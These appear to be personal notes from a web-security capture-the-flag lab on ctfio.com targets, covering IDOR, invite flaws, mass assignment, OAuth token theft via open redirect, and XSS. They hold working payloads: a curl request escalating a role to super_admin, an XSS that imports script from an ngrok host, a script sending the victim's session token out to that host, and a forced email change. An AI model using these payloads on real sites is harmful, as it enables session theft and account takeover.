___

# IDOR

```
GET https://0hl3b40h.eu1.ctfio.com/api/v1/user/2
```

![[Pasted image 20241217171151.png]]

![[Pasted image 20241217171523.png]]

# Invite Systems

![[Pasted image 20241217172150.png]]

![[Pasted image 20241217172208.png]]

## 1

![[Pasted image 20241217172546.png]]

![[Pasted image 20241217172642.png]]

# Mass Assigment

Response,
```json
const user = {"id":1,"username":"ben","role":"user"};
```

```bash
curl 'https://69xknhzf.eu1.ctfio.com/settings' --compressed -X POST -H 'Cookie: token=9435b4e9dd38cf2a8458fb3  
167186173' --data-raw 'website=http%3A%2F%2Fwww.google.com&phone=123456789&bio=Test&role=super_admin'
```

![[Pasted image 20241217175156.png]]

# OAuth Flow using Open Redirect

```js
document.location.hash.substr(1)
```

```
https://auth.fluorite.ctfio.com/auth?client_id=1&redirect_url=https://fluorite.ctfio.com/redirect?url=https://e949-83-213-97-233.ngrok-free.app/test.html&response_type=token
```

```html
<html>
<head>
    <title>Hello World :-)</title>
</head>
<body>

Hello World :-)
<script>
    window.location = 'x/' + document.location.hash.substr(1);
</script>

</body>
</html>
```

![[Pasted image 20241217180517.png]]

# XSS

```html
"><img/src=x onerror=import("https://664a-83-213-97-233.ngrok-free.app/1.js")>
```

1.js
```js
alert(1);//
```

2.js
```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/v1/me/session', true);
xhr.onload = function() {
    if (xhr.status === 200) {
        fetch('https://664a-83-213-97-233.ngrok-free.app/POC/?x=' + btoa(xhr.responseText));
    }
};
xhr.send();

alert(1);
```

![[Pasted image 20241217185744.png]]

```json
{"session":{"token":"Authentication: Bearer 295c621d5331792f1ca8dd19013f236d79df609bdf47cb5d986d544030f80215"}}
```

## 1

```js
var xhr = new XMLHttpRequest();
xhr.open('POST', '/change-email', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send('email=hacker@hacker.ctf');
```



